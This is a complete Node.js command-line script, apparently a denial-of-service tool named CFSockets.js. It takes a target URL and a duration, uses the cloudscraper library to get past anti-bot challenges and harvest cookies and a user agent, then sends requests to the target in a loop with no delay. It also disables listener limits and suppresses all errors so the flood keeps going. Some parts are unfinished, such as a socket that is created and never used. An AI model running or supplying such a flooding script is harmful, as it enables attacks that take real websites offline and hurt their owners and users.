const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);

var cloudscraper = require('cloudscraper');
const url = require('url');
if (process.argv.length <= 2) {
	console.log("Usage: node CFSockets.js <url> <time>");
	console.log("Usage: node CFSockets.js <http://example.com> <60>");
	process.exit(-1);
}
var target = process.argv[2];
var time = process.argv[3];
var cookie = "";
var ua = "";
var host = url.parse(target).host;
var cookie = "";
cloudscraper.get(target, function (error, response) {
	if (error) {
	} else {
		var parsed = JSON.parse(JSON.stringify(response));
		cookie = (parsed["request"]["headers"]["cookie"]);
		if (cookie == undefined) {
			cookie = (parsed["headers"]["set-cookie"]);
		}
		ua = (parsed["request"]["headers"]["User-Agent"]);
	}
	console.log('Received tokens!')
	console.log(cookie + '/' + ua);
});
var counter = 0;

var int = setInterval(() => {
	if (cookie !== '' && ua !== '') {
		var s = require('net').Socket();
		cloudscraper.get(target, function (error, response) {
	if (error) {
	} else {
		var parsed = JSON.parse(JSON.stringify(response));
		cookie = (parsed["request"]["headers"]["cookie"]);
		if (cookie == undefined) {
			cookie = (parsed["headers"]["set-cookie"]);
		}
		ua = (parsed["request"]["headers"]["User-Agent"]);
	}
	console.log('Received tokens!')
	console.log(cookie + '/' + ua);
});
	}
});
setTimeout(() => clearInterval(int), time * 1000);

// to not crash on errors
process.on('uncaughtException', function (err) {
	//console.log(err);
});

process.on('unhandledRejection', function (err) {
	//console.log(err);
});
